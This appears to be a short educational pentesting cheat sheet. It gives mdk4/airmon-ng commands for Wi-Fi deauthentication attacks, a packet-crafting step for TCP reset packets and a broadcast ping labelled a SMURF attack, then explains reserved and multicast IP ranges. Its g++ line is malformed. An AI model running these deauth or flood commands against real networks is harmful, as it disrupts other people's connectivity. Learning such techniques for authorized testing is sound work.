#Pentesting Network

## Dauth Frames
### Install mdk4
- `sudo apt-get install mdk4`

### Setup an interface in monitor mode
- `sudo airmon-ng start <interface>`
- If an error occurs, kill the process: `sudo airmon-ng check kill`
- `iwconfig` should show a new interface: `<interface>mon`
- The attack will be done on this interface

### Execute Dauth Attack
- `sudo mdk4 <interface> d -w <file> -c <channel>`
  - `file`: WhiteList MAC address
  - `channel`: Channel of the AP (remove `-c <channel>` for an attack on all channels)

## Crafting Packet
- Use `g++ -o rst_packet rst_packet.cpp <ipSrc> <ipDst>` (use valid IP addresses for `ipSrc` and `ipDst`)
- Check if reset packets are detected by the sniffer (RST Flag: ...)

## SMURF Attack
- `ping -b <broadcast ip> -c <number of packets> <ip to ping>`
- Or just `ping <ip>`

# IP Address
## 224.0.0.251

The IP address 224.0.0.251 is a multicast IP address reserved for the use of the Zeroconf (Zero Configuration Networking) service discovery protocol, also known as mDNS (multicast DNS). mDNS allows devices on a local network to discover and connect to each other without prior configuration. This IP address is used for the resolution of local domain names without the need for a central DNS server.

In other words, when a device on the local network is searching for other devices or services, it can broadcast multicast queries to the IP address 224.0.0.251 to discover the services available on the network without requiring a traditional DNS infrastructure. This is commonly used in home and local networks to facilitate the automatic discovery of devices and services without manual configuration.

## Reserved IP Addresses
Yes, there are several ranges of IP addresses reserved for specific purposes, such as particular services, specific communication protocols, or reserved uses for specific purposes. Here are some examples:

1. **Loopback IP Address:**
   - `127.0.0.1` is the standard loopback IP address, also known as "localhost." It is used for network testing on the local machine.

2. **Private IP Addresses:**
   - `10.0.0.0` to `10.255.255.255`
   - `172.16.0.0` to `172.31.255.255`
   - `192.168.0.0` to `192.168.255.255`
   These address ranges are reserved for use in private networks and are not routed on the public Internet.

3. **Multicast IP Addresses:**
   - Various IP addresses in the range `224.0.0.0` to `239.255.255.255` are reserved for multicast. For example, `224.0.0.1` is used for all hosts on the local network, `224.0.0.2` is used for all routers on the local network, etc.

4. **Broadcast IP Address:**
   - `255.255.255.255` is used to send data to all devices on the local network.

5. **Special IP Addresses for Reserved Protocols:**
   - `0.0.0.0` is used as an address indicating "all addresses" or "all hosts."
   - `169.254.0.0` to `169.254.255.255` is reserved for the auto-configuration of IP addresses on a local network in the absence of a DHCP server.

These reserved IP addresses contribute to organizing and optimizing the operation of the Internet and local networks by defining specific ranges for specific purposes.

**Disclaimer:** This repository is for educational purposes only. Use this information responsibly and within legal boundaries.
